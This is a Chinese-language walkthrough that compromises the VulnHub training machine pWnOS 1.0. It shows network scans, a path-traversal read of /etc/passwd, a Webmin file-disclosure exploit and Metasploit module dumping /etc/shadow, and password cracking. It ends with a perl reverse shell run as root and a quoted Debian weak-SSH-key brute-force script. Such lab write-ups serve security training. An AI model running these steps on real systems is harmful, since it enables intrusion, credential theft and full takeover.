# pWnOS 主机渗透实现

-   靶机地址：https://www.vulnhub.com/entry/pwnos-10,33/
-   下载地址：https://download.vulnhub.com/pwnos/pWnOS_v1.0.zip



## 信息收集：

### 主机发现

-   >   sudo netdiscover -i eth0 -r 192.168.2.1/24 

-   ```shell
     Currently scanning: Finished!   |   Screen View: Unique Hosts                                      
                                                                                                        
     13 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 780                                   
     _____________________________________________________________________________
       IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
     -----------------------------------------------------------------------------
     192.168.2.1     aa:a1:59:52:23:67      1      60  Unknown vendor                                   
     192.168.2.2     00:50:56:e9:75:ca      7     420  VMware, Inc.                                     
     192.168.2.138   00:0c:29:5e:18:c9      2     120  VMware, Inc.                                     
     192.168.2.254   00:50:56:e8:1f:af      3     180  VMware, Inc.  
    ```



### 端口扫描

-   ```shell
    # 使用TCP进行扫描
    └─$ nmap -sT -T 4 -p- 192.168.2.138 -oA Nmap-scan/sT-Ports
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-26 09:21 HKT
    Nmap scan report for 192.168.2.138
    Host is up (0.00090s latency).
    Not shown: 65530 closed tcp ports (conn-refused)
    PORT      STATE SERVICE
    22/tcp    open  ssh
    80/tcp    open  http
    139/tcp   open  netbios-ssn
    445/tcp   open  microsoft-ds
    10000/tcp open  snet-sensor-mgmt
    
    Nmap done: 1 IP address (1 host up) scanned in 3.62 seconds
    
    ```



### 服务及操作系统扫描

```shell
└─$ sudo nmap -sC -sV -O -p22,80,139,445,10000 192.168.2.138 -oA Nmap-scan/sC
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-26 09:25 HKT
Nmap scan report for 192.168.2.138
Host is up (0.00032s latency).

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
| ssh-hostkey: 
|   1024 e44640bfe629acc600e2b2a3e150903c (DSA)
|_  2048 10cc35458ef27aa1ccdba0e8bfc7733d (RSA)
80/tcp    open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
|_http-server-header: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6
|_http-title: Site doesn't have a title (text/html).
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MSHOME)
445/tcp   open  netbios-ssn Samba smbd 3.0.26a (workgroup: MSHOME)
10000/tcp open  http        MiniServ 0.01 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
MAC Address: 00:0C:29:5E:18:C9 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6.22
OS details: Linux 2.6.22 (embedded, ARM), Linux 2.6.22 - 2.6.23
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h30m00s, deviation: 3h32m07s, median: 0s
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.26a)
|   Computer name: ubuntuvm
|   NetBIOS computer name: 
|   Domain name: nsdlab
|   FQDN: ubuntuvm.NSDLAB
|_  System time: 2023-05-25T20:25:59-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: UBUNTUVM, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.86 seconds
                                                               
```



### 基础漏洞扫描

```shell
└─$ nmap --script=vuln -p22,80,139,445,10000 -oA Nmap-scan/script-Scan 192.168.2.138
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 192.168.2.138
Host is up (0.0021s latency).

PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
| http-enum: 
|   /icons/: Potentially interesting directory w/ listing on 'apache/2.2.4 (ubuntu) php/5.2.3-1ubuntu6'
|   /index/: Potentially interesting folder
|_  /php/: Potentially interesting directory w/ listing on 'apache/2.2.4 (ubuntu) php/5.2.3-1ubuntu6'
|_http-trace: TRACE is enabled
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
10000/tcp open  snet-sensor-mgmt
| http-vuln-cve2006-3392: 
|   VULNERABLE:
|   Webmin File Disclosure
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2006-3392
|       Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML.
|       This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences
|       to bypass the removal of "../" directory traversal sequences.
|       
|     Disclosure date: 2006-06-29
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3392
|       http://www.exploit-db.com/exploits/1997/
|_      http://www.rapid7.com/db/modules/auxiliary/admin/webmin/file_disclosure

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-061: false

# Nmap done at Fri May 26 09:45:17 2023 -- 1 IP address (1 host up) scanned in 344.92 seconds

```





## web发现：

-   首页可能存在文件包含漏洞

-   ![image-20230526094432860](https://raw.githubusercontent.com/r0o983/images/main/image-20230526094432860.png)

-   尝试读取`/etc/passwd `and `/etc/shadow` 文件

-   经过测试只能读取`/etc/passwd`

-   ```shell
    └─$ curl "192.168.2.138/index1.php?help=true&connect=true/../../../../../../../../../etc/passwd" | html2text 
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    100  2005  100  2005    0     0   956k      0 --:--:-- --:--:-- --:--:--  979k
                     ****** Welcome to the pWnOS homepage! ******
    This is the official help page. If you're too big of a n00b to figure this out,
    enter your information below for a small hint. :)
     ____________________________________________________________________
    |Name:_________|[name_____________________]| ___________| _________|
    |Skillz:_______|on00b______________________|osk1ll3d_n00b|ol33t_hax0r|
    |[Please_Help!]| _________________________| ___________| _________|
    root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:
    2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/
    sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/
    sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:
    9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
    proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh
    backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/
    var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats
    Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:
    nobody:/nonexistent:/bin/sh dhcp:x:100:101::/nonexistent:/bin/false syslog:x:
    101:102::/home/syslog:/bin/false klog:x:102:103::/home/klog:/bin/false mysql:x:
    103:107:MySQL Server,,,:/var/lib/mysql:/bin/false sshd:x:104:65534::/var/run/
    sshd:/usr/sbin/nologin vmware:x:1000:1000:vmware,,,:/home/vmware:/bin/bash
    obama:x:1001:1001::/home/obama:/bin/bash osama:x:1002:1002::/home/osama:/bin/
    bash yomama:x:1003:1003::/home/yomama:/bin/bash
    ```

-   使用`dirsearch`进行web目录探测

-   >   dirsearch -u http://192.168.2.138  -i 200,301,302

-   ```shell
    └─$ dirsearch -u http://192.168.2.138 -i 200,301,302          
    
      _|. _ _  _  _  _ _|_    v0.4.2                                                                     
     (_||| _) (/_(_|| (_| )                                                                              
                                                                                                         
    Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927
    
    Output File: /home/kali/.dirsearch/reports/192.168.2.138/_23-05-26_10-12-07.txt
    
    Error Log: /home/kali/.dirsearch/logs/errors-23-05-26_10-12-07.log
    
    Target: http://192.168.2.138/
    
    [10:12:07] Starting: 
    [10:12:07] 301 -  330B  - /php  ->  http://192.168.2.138/php/              
    [10:12:27] 200 -  295B  - /index                                            
    [10:12:27] 200 -  295B  - /index.php                                        
    [10:12:27] 200 -  295B  - /index.php/login/                                 
    [10:12:27] 200 -  156B  - /index2                                           
    [10:12:27] 200 -  156B  - /index2.php                                       
    [10:12:33] 200 -  895B  - /php/                                             
                                                                                 
    Task Completed
    ```

-   并未发现有效信息

### 两种任意文件读取漏洞利用方式

-   搜索漏洞库查找当前10000端口运行的服务(方式1)

-   ```shell
    └─$ searchsploit webmin           
    ------------------------------------------------------------------- ---------------------------------
     Exploit Title                                                     |  Path
    ------------------------------------------------------------------- ---------------------------------
    DansGuardian Webmin Module 0.x - 'edit.cgi' Directory Traversal    | cgi/webapps/23535.txt
    phpMyWebmin 1.0 - 'target' Remote File Inclusion                   | php/webapps/2462.txt
    phpMyWebmin 1.0 - 'window.php' Remote File Inclusion               | php/webapps/2451.txt
    Webmin - Brute Force / Command Execution                           | multiple/remote/705.pl
    webmin 0.91 - Directory Traversal                                  | cgi/remote/21183.txt
    Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofing        | linux/remote/22275.pl
    Webmin 0.x - 'RPC' Privilege Escalation                            | linux/remote/21765.pl
    Webmin 0.x - Code Input Validation                                 | linux/local/21348.txt
    Webmin 1.5 - Brute Force / Command Execution                       | multiple/remote/746.pl
    Webmin 1.5 - Web Brute Force (CGI)                                 | multiple/remote/745.pl
    Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasplo | unix/remote/21851.rb
    Webmin 1.850 - Multiple Vulnerabilities                            | cgi/webapps/42989.txt
    Webmin 1.900 - Remote Command Execution (Metasploit)               | cgi/remote/46201.rb
    Webmin 1.910 - 'Package Updates' Remote Command Execution (Metaspl | linux/remote/46984.rb
    Webmin 1.920 - Remote Code Execution                               | linux/webapps/47293.sh
    Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)  | linux/remote/47230.rb
    Webmin 1.962 - 'Package Updates' Escape Bypass RCE (Metasploit)    | linux/webapps/49318.rb
    Webmin 1.973 - 'run.cgi' Cross-Site Request Forgery (CSRF)         | linux/webapps/50144.py
    Webmin 1.973 - 'save_user.cgi' Cross-Site Request Forgery (CSRF)   | linux/webapps/50126.py
    Webmin 1.984 - Remote Code Execution (Authenticated)               | linux/webapps/50809.py
    Webmin 1.996 - Remote Code Execution (RCE) (Authenticated)         | linux/webapps/50998.py
    Webmin 1.x - HTML Email Command Execution                          | cgi/webapps/24574.txt
    Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure       | multiple/remote/1997.php
    Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure       | multiple/remote/2017.pl
    Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)      | linux/webapps/47330.rb
    ------------------------------------------------------------------- ---------------------------------
    Shellcodes: No Results
    ------------------------------------------------------------------- ---------------------------------
     Paper Title                                                       |  Path
    ------------------------------------------------------------------- ---------------------------------
    WebMin - (XSS BUG) Remote Arbitrary File Disclosure                | docs/english/13117-webmin---(xss
    ------------------------------------------------------------------- ---------------------------------
    ```

-   下载对应的poc文件 --> `searchsploit webmin -m 2017.pl `

-   使用脚本执行任意文件读取

-   ```shell
    └─$ ./2017.pl 192.168.2.138 10000 /etc/shadow 0                                                 
    WEBMIN EXPLOIT !!!!! coded by UmZ!
    Comments and Suggestions are welcome at umz32.dll [at] gmail.com
    Vulnerability disclose at securitydot.net
    I am just coding it in perl 'cuz I hate PHP!
    Attacking 192.168.2.138 on port 10000!
    FILENAME:  /etc/shadow
    
     FILE CONTENT STARTED
     -----------------------------------
    root:$1$LKrO9Q3N$EBgJhPZFHiKXtK0QRqeSm/:14041:0:99999:7:::
    daemon:*:14040:0:99999:7:::
    bin:*:14040:0:99999:7:::
    sys:*:14040:0:99999:7:::
    sync:*:14040:0:99999:7:::
    games:*:14040:0:99999:7:::
    man:*:14040:0:99999:7:::
    lp:*:14040:0:99999:7:::
    mail:*:14040:0:99999:7:::
    news:*:14040:0:99999:7:::
    uucp:*:14040:0:99999:7:::
    proxy:*:14040:0:99999:7:::
    www-data:*:14040:0:99999:7:::
    backup:*:14040:0:99999:7:::
    list:*:14040:0:99999:7:::
    irc:*:14040:0:99999:7:::
    gnats:*:14040:0:99999:7:::
    nobody:*:14040:0:99999:7:::
    dhcp:!:14040:0:99999:7:::
    syslog:!:14040:0:99999:7:::
    klog:!:14040:0:99999:7:::
    mysql:!:14040:0:99999:7:::
    sshd:!:14040:0:99999:7:::
    vmware:$1$7nwi9F/D$AkdCcO2UfsCOM0IC8BYBb/:14042:0:99999:7:::
    obama:$1$hvDHcCfx$pj78hUduionhij9q9JrtA0:14041:0:99999:7:::
    osama:$1$Kqiv9qBp$eJg2uGCrOHoXGq0h5ehwe.:14041:0:99999:7:::
    yomama:$1$tI4FJ.kP$wgDmweY9SAzJZYqW76oDA.:14041:0:99999:7:::
    
     -------------------------------------
    
    ```

-   使用msf进行文件读取(方式2)

-   读取`/etc/shadow`文件

-   ```shell
    └─$ msfconsole             
    [*] starting the Metasploit Framework console...|
                                                      
                                       ____________
     [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
     [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $S`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
     [%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]
     [% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]
     [% |        ||  -__||   _||  _  ||  ,,aS$""`  ||  _  ||  ||  _  ||  ||   _|%%]
     [% |__|__|__||_____||____||___._||%$P"`       ||   __||__||_____||__||____|%%]
     [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| `"a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]
     [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`"a,$$__|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
     [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `"$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
     [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
    
    
           =[ metasploit v6.3.16-dev                          ]
    + -- --=[ 2315 exploits - 1208 auxiliary - 412 post       ]
    + -- --=[ 975 payloads - 46 encoders - 11 nops            ]
    + -- --=[ 9 evasion                                       ]
    
    Metasploit tip: Enable HTTP request and response logging 
    with set HttpTrace true
    Metasploit Documentation: https://docs.metasploit.com/
    
    [*] Starting persistent handler(s)...
    msf6 > 
    msf6 > use auxiliary/admin/webmin/file_disclosure
    msf6 auxiliary(admin/webmin/file_disclosure) > show options 
    
    Module options (auxiliary/admin/webmin/file_disclosure):
    
       Name     Current Setting   Required  Description
       ----     ---------------   --------  -----------
       DIR      /unauthenticated  yes       Webmin directory path
       Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
       RHOSTS                     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
       RPATH    /etc/passwd       yes       The file to download
       RPORT    10000             yes       The target port (TCP)
       SSL      false             no        Negotiate SSL/TLS for outgoing connections
       VHOST                      no        HTTP server virtual host
    
    
    Auxiliary action:
    
       Name      Description
       ----      -----------
       Download  Download arbitrary file
    
    
    
    View the full module info with the info, or info -d command.
    
    msf6 auxiliary(admin/webmin/file_disclosure) > set rhosts 192.168.2.138
    rhosts => 192.168.2.138
    msf6 auxiliary(admin/webmin/file_disclosure) > set rpath /etc/shadow
    rpath => /etc/shadow
    msf6 auxiliary(admin/webmin/file_disclosure) > run
    [*] Running module against 192.168.2.138
    
    [*] Attempting to retrieve /etc/shadow...
    [*] The server returned: 200 Document follows
    root:$1$LKrO9Q3N$EBgJhPZFHiKXtK0QRqeSm/:14041:0:99999:7:::
    daemon:*:14040:0:99999:7:::
    bin:*:14040:0:99999:7:::
    sys:*:14040:0:99999:7:::
    sync:*:14040:0:99999:7:::
    games:*:14040:0:99999:7:::
    man:*:14040:0:99999:7:::
    lp:*:14040:0:99999:7:::
    mail:*:14040:0:99999:7:::
    news:*:14040:0:99999:7:::
    uucp:*:14040:0:99999:7:::
    proxy:*:14040:0:99999:7:::
    www-data:*:14040:0:99999:7:::
    backup:*:14040:0:99999:7:::
    list:*:14040:0:99999:7:::
    irc:*:14040:0:99999:7:::
    gnats:*:14040:0:99999:7:::
    nobody:*:14040:0:99999:7:::
    dhcp:!:14040:0:99999:7:::
    syslog:!:14040:0:99999:7:::
    klog:!:14040:0:99999:7:::
    mysql:!:14040:0:99999:7:::
    sshd:!:14040:0:99999:7:::
    vmware:$1$7nwi9F/D$AkdCcO2UfsCOM0IC8BYBb/:14042:0:99999:7:::
    obama:$1$hvDHcCfx$pj78hUduionhij9q9JrtA0:14041:0:99999:7:::
    osama:$1$Kqiv9qBp$eJg2uGCrOHoXGq0h5ehwe.:14041:0:99999:7:::
    yomama:$1$tI4FJ.kP$wgDmweY9SAzJZYqW76oDA.:14041:0:99999:7:::
    [*] Auxiliary module execution completed
    msf6 auxiliary(admin/webmin/file_disclosure) > 
    
    ```

-   将账号密码保存到文档中进行破解--> 得到账号密码:`vmware:h4ckm3`

-   ```shell
    └─$ john  Pass-crash --wordlist=/usr/share/wordlists/rockyou.txt                 
    Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
    Use the "--format=md5crypt-long" option to force loading these as that type instead
    Using default input encoding: UTF-8
    Loaded 5 password hashes with 5 different salts (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
    Will run 4 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    h4ckm3           (vmware)     
    1g 0:00:05:24 DONE (2023-05-26 11:18) 0.003083g/s 43474p/s 197323c/s 197323C/s  ejngyhga007..*7¡Vamos!
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed. 
    
    # 查看已破解的密码
    └─$ john --show Pass-crash 
    vmware:h4ckm3
    
    1 password hash cracked, 4 left
    
    
    ```

-   使用ssh进行登陆尝试 --> 密钥类型不匹配，需要指定类型为：`ssh-rsa,ssh-dss`

-   获得初始shell

-   ```shell
    └─$ ssh vmware@192.168.2.138
    Unable to negotiate with 192.168.2.138 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
                                                                                                         
    ┌──(kali㉿kali)-[~/Documents/WalkThrough/pWnOS1.0]
    └─$ ssh -oHostKeyAlgorithms=ssh-rsa,ssh-dss vmware@192.168.2.138
    The authenticity of host '192.168.2.138 (192.168.2.138)' can't be established.
    RSA key fingerprint is SHA256:+C7UA7dQ1B/8zVWHRBD7KeNNfjuSBrtQBMZGd6qoR9w.
    This key is not known by any other names.
    Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
    Warning: Permanently added '192.168.2.138' (RSA) to the list of known hosts.
    vmware@192.168.2.138's password: 
    Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686
    
    The programs included with the Ubuntu system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.
    
    Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
    applicable law.
    Last login: Thu May 25 22:33:04 2023 from 192.168.2.128
    vmware@ubuntuvm:~$ sudo -l
    [sudo] password for vmware:
    Sorry, user vmware may not run sudo on ubuntuvm.
    vmware@ubuntuvm:~$ ip a
    1: lo: <LOOPBACK,UP,10000> mtu 16436 qdisc noqueue 
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
        inet6 ::1/128 scope host 
           valid_lft forever preferred_lft forever
    2: eth0: <BROADCAST,MULTICAST,UP,10000> mtu 1500 qdisc pfifo_fast qlen 1000
        link/ether 00:0c:29:5e:18:c9 brd ff:ff:ff:ff:ff:ff
        inet 192.168.2.138/24 brd 192.168.2.255 scope global eth0
        inet6 fe80::20c:29ff:fe5e:18c9/64 scope link 
           valid_lft forever preferred_lft forever
    vmware@ubuntuvm:~$ uname -a
    Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686 GNU/Linux
    
    
    ```

### 获取root权限

-   使用kali自带脚本来进行提权操作

-   >   └─$ cp /usr/share/webshells/perl/perl-reverse-shell.pl shell.cgi

-   修改脚本中的IP地址

-   ![image-20230526163107173](https://raw.githubusercontent.com/r0o983/images/main/image-20230526163107173.png)

-   修改IP为kali的地址

-   将文件上传到目标机

-   ```shell
    # 使用scp进行传输文件
    └─$ scp -oHostKeyAlgorithms=ssh-rsa,ssh-dss shell.cgi vmware@192.168.2.138:/home/vmware/shell.cgi
    vmware@192.168.2.138's password: 
    shell.cgi 
    
    # 使用nc传输文件 --> kali发送
    └─$ nc -nvlp 1234 < shell.cgi 
    
    # 使用nc传输文件 --> 靶机接收
    vmware@ubuntuvm:/var/tmp$ nc -nv 192.168.2.128 1234 > webshell.cgi
    (UNKNOWN) [192.168.2.128] 1234 (?) open
    
    ```

-   使用脚本执行上传的cgi文件

-   ```shell
    └─$ ./2017.pl 192.168.2.138 10000 /var/tmp/shell.cgi 0 
    WEBMIN EXPLOIT !!!!! coded by UmZ!
    Comments and Suggestions are welcome at umz32.dll [at] gmail.com
    Vulnerability disclose at securitydot.net
    I am just coding it in perl 'cuz I hate PHP!
    Attacking 192.168.2.138 on port 10000!
    FILENAME:  /var/tmp/shell.cgi
    
     FILE CONTENT STARTED
     -----------------------------------
    Browser IP address appears to be: 192.168.2.128<p>
    
     -------------------------------------
    
    ```

-   开启监听等待靶机连接

-   获得root权限

-   ```shell
    └─$ nc -nvlp 1234
    listening on [any] 1234 ...
    connect to [192.168.2.128] from (UNKNOWN) [192.168.2.138] 44223
     03:29:28 up  7:24,  2 users,  load average: 1.00, 0.94, 0.61
    USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
    vmware   tty1     -                20:06    2:19   0.03s  0.02s -bash
    vmware   pts/0    192.168.2.128    22:33    6:14m  0.13s  0.03s /bin/bash
    Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686 GNU/Linux
    uid=0(root) gid=0(root)
    
    /usr/sbin/apache: can't access tty; job control turned off
    # whoami
    root
    # ip a
    1: lo: <LOOPBACK,UP,10000> mtu 16436 qdisc noqueue 
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
        inet6 ::1/128 scope host 
           valid_lft forever preferred_lft forever
    2: eth0: <BROADCAST,MULTICAST,UP,10000> mtu 1500 qdisc pfifo_fast qlen 1000
        link/ether 00:0c:29:5e:18:c9 brd ff:ff:ff:ff:ff:ff
        inet 192.168.2.138/24 brd 192.168.2.255 scope global eth0
        inet6 fe80::20c:29ff:fe5e:18c9/64 scope link 
           valid_lft forever preferred_lft forever
    # sudo -l
    User root may run the following commands on this host:
        (ALL) ALL
    #        
    ```

### 利用任意文件读取漏洞可获得基础shell方式（2）

-   通过读取用户在`home`目录下的`.ssh`文件夹下的`authorized_keys`文件来查看公钥

-   ```shell
    └─$ ./2017.pl 192.168.2.138 10000 /home/vmware/.ssh/authorized_keys 0
    WEBMIN EXPLOIT !!!!! coded by UmZ!
    Comments and Suggestions are welcome at umz32.dll [at] gmail.com
    Vulnerability disclose at securitydot.net
    I am just coding it in perl 'cuz I hate PHP!
    Attacking 192.168.2.138 on port 10000!
    FILENAME:  /home/vmware/.ssh/authorized_keys
    
     FILE CONTENT STARTED
     -----------------------------------
    ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAzASM/LKs+FLB7zfmy14qQJUrsQsEOo9FNkoilHAgvQuiE5Wy9DwYVfLrkkcDB2uubtMzGw9hl3smD/OwUyXc/lNED7MNLS8JvehZbMJv1GkkMHvv1Vfcs6FVnBIfPBz0OqFrEGf+a4JEc/eF2R6nIJDIgnjBVeNcQaIM3NOr1rYPzgDwAH/yWoKfzNv5zeMUkMZ7OVC54AovoSujQC/VRdKzGRhhLQmyFVMH9v19UrLgJB6otLcr3d8/uAB2ypTw+LmuIPe9zqrMwxskdfY4Sth2rl6D3bq6Fwca+pYh++phOyKeDPYkBi3hx6R3b3ETZlNCLJjG7+t7kwFdF02Iuw== vmware@ubuntuvm
    
     -------------------------------------
                                                                                                         
    ┌──(kali㉿kali)-[~/Documents/WalkThrough/pWnOS1.0]
    └─$ vim vmware-keys                                                              
                                                                                                         
    ┌──(kali㉿kali)-[~/Documents/WalkThrough/pWnOS1.0]
    └─$ ./2017.pl 192.168.2.138 10000 /home/obama/.ssh/authorized_keys 0
    WEBMIN EXPLOIT !!!!! coded by UmZ!
    Comments and Suggestions are welcome at umz32.dll [at] gmail.com
    Vulnerability disclose at securitydot.net
    I am just coding it in perl 'cuz I hate PHP!
    Attacking 192.168.2.138 on port 10000!
    FILENAME:  /home/obama/.ssh/authorized_keys
    
     FILE CONTENT STARTED
     -----------------------------------
    ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAxRuWHhMPelB60JctxC6BDxjqQXggf0ptx2wrcAw09HayPxMnKv+BFiGA/I1yXn5EqUfuLSDcTwiIeVSvqJl3NNI5HQUUc6KGlwrhCW464ksARX2ZAp9+6Yu7DphKZmtF5QsWaiJc7oV5il89zltwBDqR362AH49m8/3OcZp4XJqEAOlVWeT5/jikmke834CyTMlIcyPL85LpFw2aXQCJQIzvkCHJAfwTpwJTugGMB5Ng73omS82Q3ErbOhTSa5iBuE86SEkyyotEBUObgWU3QW6ZMWM0Rd9ErIgvps1r/qpteMMrgieSUKlF/LaeMezSXXkZrn0x+A2bKsw9GwMetQ== obama@ubuntuvm
    
     -------------------------------------
    
    ```

-   搜索漏洞库`prng` 

-   ![image-20230526184416715](https://raw.githubusercontent.com/r0o983/images/main/image-20230526184416715.png)

-   这三个文件任意下载一个，操作方式都是类似的，这里下载`5622.txt`文件 --> `searchspoit prng -m 5622.txt`

-   ```shell
    └─$ cat 5622.txt 
    the debian openssl issue leads that there are only 65.536 possible ssh
    keys generated, cause the only entropy is the pid of the process
    generating the key.
    
    This leads to that the following perl script can be used with the
    precalculated ssh keys to brute force the ssh login. It works if such a
    keys is installed on a non-patched debian or any other system manual
    configured to.
    
    On an unpatched system, which doesn't need to be debian, do the following:
    
    keys provided by HD Moore - http://metasploit.com/users/hdm/tools/debian-openssl/
    ***E-DB Note: Mirror ~ https://github.com/g0tmi1k/debian-ssh***
    
    1. Download http://sugar.metasploit.com/debian_ssh_rsa_2048_x86.tar.bz2
                https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/5622.tar.bz2 (debian_ssh_rsa_2048_x86.tar.bz2)
    
    2. Extract it to a directory
    
    3. Enter into the /root/.ssh/authorized_keys a SSH RSA key with 2048
    Bits, generated on an upatched debian (this is the key this exploit will
    break)
    
    4. Run the perl script and give it the location to where you extracted
    the bzip2 mentioned.
    
    #!/usr/bin/perl
    my $keysPerConnect = 6;
    unless ($ARGV[1]) {
       print "Syntax : ./exploiter.pl pathToSSHPrivateKeys SSHhostToTry\n";
       print "Example: ./exploiter.pl /root/keys/ 127.0.0.1\n";
       print "By mm@deadbeef.de\n";
       exit 0;
    }
    chdir($ARGV[0]);
    opendir(A, $ARGV[0]) || die("opendir");
    while ($_ = readdir(A)) {
       chomp;
       next unless m,^\d+$,;
       push(@a, $_);
       if (scalar(@a) > $keysPerConnect) {
          system("echo ".join(" ", @a)."; ssh -l root ".join(" ", map { "-i
    ".$_ } @a)." ".$ARGV[1]);
          @a = ();
       }
    }
    
    5. Enjoy the shell after some minutes (less than 20 minutes)
    
    Regards,
    Markus Mueller
    mm@deadbeef.de
    
    # milw0rm.com [2008-05-15]                     
    ```

-   根据提示下载压缩包`wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/5622.tar.bz2`

-   将文件解压后根据提示进入文件夹并进行搜索与公钥相匹配的私钥

-   ```shell
    └─$ grep -lr "AAAAB3NzaC1yc2EAAAABIwAAAQEAxRuWHhMPelB60JctxC6BDx" ./rsa/2048/
    ./rsa/2048/dcbe2a56e8cdea6d17495f6648329ee2-4679.pub
    
    参数说明：
    	-l 搜索到结果后列出文件名
    	-r 递归搜索
    ```

